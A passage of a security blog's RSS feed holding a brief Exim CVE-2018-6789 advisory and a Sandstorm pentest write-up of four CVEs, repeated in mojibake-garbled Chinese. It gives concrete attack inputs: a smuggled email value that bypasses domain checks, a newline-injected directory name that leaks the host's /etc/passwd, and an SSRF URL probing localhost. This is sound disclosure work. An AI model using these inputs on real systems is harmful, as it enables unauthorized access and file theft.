                <title>Exim ä»»æ„ä»£ç¢¼åŸ·è¡Œæ¼æ´ (CVE-2018-6789)</title>
                <description>&lt;h2 id=&quot;å…§å®¹&quot;&gt;å…§å®¹&lt;/h2&gt;

&lt;p&gt;ä»Šå¹´æˆ‘å€‘å‘ Exim å›å ±äº†ä¸€å€‹ä½æ–¼ base64 è§£ç¢¼å‡½å¼çš„æº¢å‡ºæ¼æ´ï¼Œç·¨è™Ÿç‚º &lt;strong&gt;CVE-2018-6789&lt;/strong&gt;ã€‚æ­¤æ¼æ´å¾ Exim å°ˆæ¡ˆé–‹å§‹æ™‚å³å­˜åœ¨ï¼Œå› æ­¤&lt;strong&gt;å½±éŸ¿ Exim çš„æ‰€æœ‰ç‰ˆæœ¬&lt;/strong&gt;ã€‚&lt;/p&gt;

&lt;p&gt;æ ¹æ“šæˆ‘å€‘çš„ç ”ç©¶ï¼Œæ”»æ“Šè€…å¯åˆ©ç”¨æ­¤æ¼æ´é”æˆ&lt;strong&gt;é ç«¯ä»»æ„ä»£ç¢¼åŸ·è¡Œï¼Œä¸¦ä¸”ä¸éœ€ä»»ä½•èªè­‰&lt;/strong&gt;ï¼Œè‡³å°‘æœ‰ 40 è¬å° Exim ä¼ºæœå™¨å—æ­¤æ¼æ´å½±éŸ¿ä¸¦å­˜åœ¨è¢«æ”»æ“Šçš„é¢¨éšªã€‚æˆ‘å€‘å»ºè­°ç«‹å³å°‡ Exim &lt;strong&gt;å‡ç´šè‡³ 4.90.1 ç‰ˆ&lt;/strong&gt;ä»¥å…é­å—æ”»æ“Šã€‚&lt;/p&gt;

&lt;h2 id=&quot;ç´°ç¯€&quot;&gt;ç´°ç¯€&lt;/h2&gt;

&lt;p&gt;è©³ç´°çš„æŠ€è¡“ç´°ç¯€è«‹åƒé–±æˆ‘å€‘çš„ Advisoryï¼š&lt;br /&gt;
&lt;a href=&quot;https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/&quot;&gt;https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/&lt;/a&gt;&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789/</link>
                <guid>https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789</guid>
                <pubDate>Tue, 06 Mar 2018 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Sandstorm Security Review</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200-en/&quot;&gt;Sandstorm Security Review&lt;/a&gt; (English Version)  &lt;br /&gt;
&lt;a href=&quot;/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200/&quot;&gt;ä¸€æ¬¡åœ¨ Sandstorm è·³è„«æ²™ç®±çš„æ»²é€ç¶“é©—&lt;/a&gt; (ä¸­æ–‡ç‰ˆæœ¬)&lt;/p&gt;

&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;In early 2017, we had a pentesting target protected with &lt;a href=&quot;https://sandstorm.io/&quot;&gt;Sandstorm&lt;/a&gt;. Sandstorm is a web-based platform which allows users to install their web apps, such as WordPress, GitLab, etc. The main feature of Sandstorm is that it containerizes every app in its own sandbox. Therefore, even though we had found several vulnerabilities of the apps, we still could not put a threat to the server.&lt;/p&gt;

&lt;p&gt;In order to leverage the vulnerabilities, we put part of efforts into review of Sandstormâ€™s source codes, and tried to escape the sandbox to impact the whole server. Finally, we found a number of uncommon and interesting vulnerabilities, and received CVE IDs as follows:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2017-6198 (Denial of Service)&lt;/li&gt;
  &lt;li&gt;CVE-2017-6199 (Bypassing Authorization Schema)&lt;/li&gt;
  &lt;li&gt;CVE-2017-6200 (Insecure Direct Object References)&lt;/li&gt;
  &lt;li&gt;CVE-2017-6201 (Server-Side Request Forgery)&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;exploitation-details&quot;&gt;Exploitation Details&lt;/h2&gt;

&lt;h3 id=&quot;cve-2017-6198&quot;&gt;CVE-2017-6198&lt;/h3&gt;

&lt;p&gt;This is a DoS created by system resource exhaustion. The root cause is that Sandstorm does not have a comprehensive policy to limit the amount of resource used by every apps run on it. In &lt;code class=&quot;highlighter-rouge&quot;&gt;src/sandstorm/supervisor.c++&lt;/code&gt; only the maximum number of files opened by each process was limited. See the codes below:&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SupervisorMain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setResourceLimits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rlimit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rlim_cur&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rlim_max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;KJ_SYSCALL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setrlimit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RLIMIT_NOFILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/supervisor.c++#L824&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/supervisor.c++#L824&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Since supervisor does not restrict the amount of subprocesses and storage usage, attackers can raise a resource exhaustion attack to crash the server by simply uploading a malicious app which keeps calling fork() (aka the â€œfork bombâ€) or consumes huge storage space.&lt;/p&gt;

&lt;h3 id=&quot;cve-2017-6199&quot;&gt;CVE-2017-6199&lt;/h3&gt;

&lt;p&gt;Usually Sandstorm will designate unique permissions to the specific members of a certain organization, and the default membership validation method is to check userâ€™s email address and see whether the string after &lt;code class=&quot;highlighter-rouge&quot;&gt;@&lt;/code&gt; exists in their white list. See the codes below:&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;identity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toLowerCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;@&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;emailDomain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/shell/packages/sandstorm-db/db.js#L1112&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/shell/packages/sandstorm-db/db.js#L1112&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Therefore, when an attacker fills in an email like &lt;code class=&quot;highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; and the system will automatically consider the attacker a member of the &lt;code class=&quot;highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; organization.&lt;/p&gt;

&lt;p&gt;Another key factor that contributes to the successful attack lies in one of the features when users log on Sandstorm. Users does not need to set up passwords for Sandstorm. Each time when the users need to log onto the service, they only need to fill in their email address, and theyâ€™ll receive a set of random unique password for login. The reason why the example above works is because the system treats &lt;code class=&quot;highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; as a user from aaa.bbb domain, and the random password will be sent to the two email addresses, &lt;code class=&quot;highlighter-rouge&quot;&gt;demo@devco.re&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ccc@aaa.bbb&lt;/code&gt; As long as one can receive the password, they can log in to use the service.&lt;/p&gt;

&lt;p&gt;Below is a quick demonstration:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;On Sandstorm, restrict access to users from domain &lt;code class=&quot;highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; only.&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180126/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;On login page, fill in &lt;code class=&quot;highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; for the email field.&lt;br /&gt;
(Note: at the front end, the email field is checked with HTML5 validation, but it is not further checked for validity at the back end)&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180126/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Retrieve random password in demo@devco.re mailbox.&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180126/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Login successful. &lt;code class=&quot;highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; is considered as a user and member of &lt;code class=&quot;highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; organization!&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180126/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;In our pentesting, the target website allowed users from validated domains to install their own apps. Therefore, through this bypass exploit, further attacks could be accomplished by combining other vulnerabilities described in this blog post (CVE-2017-6198, CVE-2017-6200, CVE-2017-6201).&lt;/p&gt;

&lt;h3 id=&quot;cve-2017-6200&quot;&gt;CVE-2017-6200&lt;/h3&gt;

&lt;p&gt;This is an interesting vulnerability. Totally two little validation flaws were exploited to initiate this attack!&lt;br /&gt;
On Sandstorm, owners of each Grain (Sandstorm container, in short, an app sandbox) can download their backup data for the app. But because of the two vulnerabilities in the packing process, an attacker can pack the files under the &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/run&lt;/code&gt; directories located on the server outside the sandbox. The security issues were as follows:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;The packing process has hid &lt;code class=&quot;highlighter-rouge&quot;&gt;/var&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;/proc&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc&lt;/code&gt; and other sensitive directories, but did not hide &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc.host&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/run.host&lt;/code&gt; these two directories. These directories are the aliases for the directories &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/run&lt;/code&gt; on the server respectively, which are relatively newer features.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The system will pack the legitimate files, have them sorted out, and create zip packages through the standard input interface. The separation between files are determined by line-breaks (&lt;code class=&quot;highlighter-rouge&quot;&gt;\n&lt;/code&gt;). As a result, when a line-break string appears in the file name, illegal path file names can be injected and packed with zip. Although the app checks whether there is a line-break in the file name, but the directory name was not checked.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/backup.c%2B%2B#L271&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/backup.c%2B%2B#L271&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;By using these two vulnerabilities together, the attacker simply has to create a directory in the sandbox &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/exp\n/etc.host/passwd\n&lt;/code&gt; , then backup files containing &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; on the server can be retrieved through backup downloading function.&lt;/p&gt;

&lt;p&gt;Screenshot of a real-world scenario:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;First, create a new directory in Grain &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/exp\n/etc.host/passwd\n&lt;/code&gt;, and use the Grain Backup function to download the backup file.&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180126/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;After unzipping the backup file, from &lt;code class=&quot;highlighter-rouge&quot;&gt;etc.host&lt;/code&gt; weâ€™ll see &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; of the server outside the sandbox.&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180126/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;cve-2017-6201&quot;&gt;CVE-2017-6201&lt;/h3&gt;

&lt;p&gt;This is a classic SSRF (Server-Side Request Forgery) issue. Sandstorm allow installation of apps from arbitrary sources, and an attacker can simply let the server access a certain location by providing an installation URL. The problem was identified on &lt;code class=&quot;highlighter-rouge&quot;&gt;https://[target]/install/xxxChangeItEveryTimexxx?url=http://127.0.0.1:22/&lt;/code&gt; This sample link confirms whether the serverâ€™s port 22 is open.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20180126/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;center&gt;(Parse Error, which implies serverâ€™s port 22 is open)&lt;/center&gt;

&lt;h2 id=&quot;follow-up-updates&quot;&gt;Follow-up Updates&lt;/h2&gt;

&lt;p&gt;After we reported the vulnerabilities, Sandstorm fixed it immediately and then published an article:&lt;br /&gt;
&lt;a href=&quot;https://sandstorm.io/news/2017-03-02-security-review&quot;&gt;https://sandstorm.io/news/2017-03-02-security-review&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Through this pentesting experience, we consider Sandstorm a safe platform with outstanding security mechanisms. This is mainly attributed to its fundamental design rationale: to assume that every app installed is malicious. With this vigilant assumption, Sandstormâ€™s defence mechanisms for the core system become comprehensive and watertight. Apart from the server-side protection, some common client-side attacks (such as XSS, CSRF) are handled properly by Sandstormâ€™s unique countermeasures, such as host name randomization. That is, it is very difficult for attackers to sabotage the server by simply manipulating the apps, and so does privilege escalation through attacking at the client-side.&lt;/p&gt;

&lt;p&gt;Nevertheless, such an impressive platform still had some minor mistakes which led to security issues. Most of the vulnerabilities found this time are improper usages of libraries or negligence of existing defence architecture while introducing new features. These types of vulnerability are also common in our other projects. We would like to take the opportunity to remind developers, always present a comprehensive security review especially when developing new features to avoid vulnerabilities caused by the gaps between defence mechanisms.&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200-en/</link>
                <guid>https://devco.re/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200-en</guid>
                <pubDate>Fri, 26 Jan 2018 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>ä¸€æ¬¡åœ¨ Sandstorm è·³è„«æ²™ç®±çš„æ»²é€ç¶“é©—</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200-en/&quot;&gt;Sandstorm Security Review&lt;/a&gt; (English Version)  &lt;br /&gt;
&lt;a href=&quot;/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200/&quot;&gt;ä¸€æ¬¡åœ¨ Sandstorm è·³è„«æ²™ç®±çš„æ»²é€ç¶“é©—&lt;/a&gt; (ä¸­æ–‡ç‰ˆæœ¬)&lt;/p&gt;

&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h2&gt;

&lt;p&gt;2017 å¹´åˆï¼Œæˆ‘å€‘æœ‰å€‹æ»²é€æ¸¬è©¦å°ˆæ¡ˆï¼Œå°ˆæ¡ˆçš„æ¨™çš„æ¶æ§‹åœ¨ &lt;a href=&quot;https://sandstorm.io/&quot;&gt;Sandstorm&lt;/a&gt; ä¹‹ä¸Šã€‚Sandstorm æ˜¯ä¸€æ¬¾ Web å¹³å°ï¼Œä½¿ç”¨è€…å¯ä»¥è¼•æ˜“çš„åœ¨è©²å¹³å°å®‰è£å„ç¨® Web Appï¼ˆå¦‚ WordPressã€GitLabâ€¦ï¼‰ï¼Œè©²å¹³å°æœ€å¤§çš„ç‰¹è‰²åœ¨æ–¼é€™äº› App éƒ½æ˜¯åœ¨æ²™ç®±ä¸­åŸ·è¡Œã€‚å› æ­¤ï¼Œå³ä½¿æˆ‘å€‘æ¸¬è©¦ä¸­æ‰¾åˆ°å¤šé … App å¼±é»ï¼Œä¹Ÿç„¡æ³•å°å¹³å°æœ¬èº«é€ æˆå¨è„…ã€‚&lt;/p&gt;

&lt;p&gt;ç‚ºäº†è®“å¼±é»æ•ˆç›Šæœ€å¤§åŒ–ï¼Œæˆ‘å€‘å°‡ä¸€éƒ¨åˆ†ç²¾åŠ›è½‰ç§»åˆ°ç ”ç©¶ Sandstorm åŸå§‹ç¢¼ï¼Œç›®çš„æ˜¯è·³è„« App çš„æ²™ç®±ç’°å¢ƒçœ‹æœ‰æ²’æœ‰æ©Ÿæœƒå½±éŸ¿æ•´å°ä¼ºæœå™¨ã€‚æœ€å¾Œï¼Œæˆ‘å€‘æ‰¾åˆ°äº†å¹¾å€‹å°‘è¦‹ä¸”æœ‰è¶£çš„å¼±é»ï¼Œä¸¦ç”³è«‹ CVE ç·¨è™Ÿå¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;é˜»æ–·æœå‹™æ”»æ“Šï¼ˆDenial of Serviceï¼‰ï¼ŒCVE-2017-6198&lt;/li&gt;
  &lt;li&gt;ç¹éæˆæ¬Šæ¨¡å¼ï¼ˆBypassing Authorization Schemaï¼‰ï¼ŒCVE-2017-6199&lt;/li&gt;
  &lt;li&gt;ä¸å®‰å…¨çš„ç›´æ¥å­˜å–ç‰©ä»¶ï¼ˆInsecure Direct Object Referencesï¼‰ï¼ŒCVE-2017-6200&lt;/li&gt;
  &lt;li&gt;æœå‹™ç«¯è«‹æ±‚å½é€ ï¼ˆServer-Side Request Forgeryï¼‰ï¼ŒCVE-2017-6201&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;æ¼æ´ç´°ç¯€&quot;&gt;æ¼æ´ç´°ç¯€&lt;/h2&gt;

&lt;h3 id=&quot;cve-2017-6198&quot;&gt;CVE-2017-6198&lt;/h3&gt;

&lt;p&gt;é€™æ˜¯ä¸€å€‹æ¶ˆè€—ç³»çµ±è³‡æºé€ æˆçš„ DoSã€‚èµ·å› æ˜¯ Sandstorm ä¸¦æœªå®Œå–„é™åˆ¶æ¯å€‹ App æ‰€èƒ½ä½¿ç”¨çš„è³‡æºï¼Œåœ¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;src/sandstorm/supervisor.c++&lt;/code&gt; åƒ…é™åˆ¶äº†æ¯å€‹ç¨‹åºèƒ½å¤ æ‰“é–‹çš„æœ€å¤šæª”æ¡ˆæ•¸ï¼Œç›¸é—œç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SupervisorMain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setResourceLimits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rlimit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rlim_cur&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rlim_max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;KJ_SYSCALL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setrlimit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RLIMIT_NOFILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/supervisor.c++#L824&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/supervisor.c++#L824&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ç”±æ–¼ supervisor æœªé™åˆ¶å­ç¨‹åºæ•¸é‡ä»¥åŠæœªé™åˆ¶å„²å­˜ç©ºé–“ç”¨é‡ï¼Œå› æ­¤æ”»æ“Šè€…åªè¦è®“ App ä¸æ–·åŸ·è¡Œ forkï¼ˆé€šå¸¸ç¨±ç‚º Fork Bombï¼‰æˆ–æ˜¯å¤§é‡ä½¿ç”¨ç¡¬ç¢Ÿç©ºé–“ï¼Œå°±æœƒé€ æˆä¼ºæœå™¨è³‡æºä¸è¶³è€Œä¸­æ–·æœå‹™ã€‚&lt;/p&gt;

&lt;h3 id=&quot;cve-2017-6199&quot;&gt;CVE-2017-6199&lt;/h3&gt;

&lt;p&gt;é€šå¸¸ Sandstorm æœƒè¨­å®šç‰¹å®šçµ„ç¹”æˆå“¡æ‰èƒ½æ“æœ‰ç‰¹æ®Šçš„æ¬Šé™ï¼Œè€Œç³»çµ±é è¨­çš„çµ„ç¹”æˆå“¡åˆ¤æ–·æ–¹å¼æ˜¯æª¢æŸ¥ä½¿ç”¨è€… email ä¸­ã€Œ@ã€ç¬¦è™Ÿæœ€å¾Œçš„å­—ä¸²æ˜¯å¦åœ¨ç™½åå–®å…§ï¼Œç›¸é—œç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;identity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toLowerCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;@&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;emailDomain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
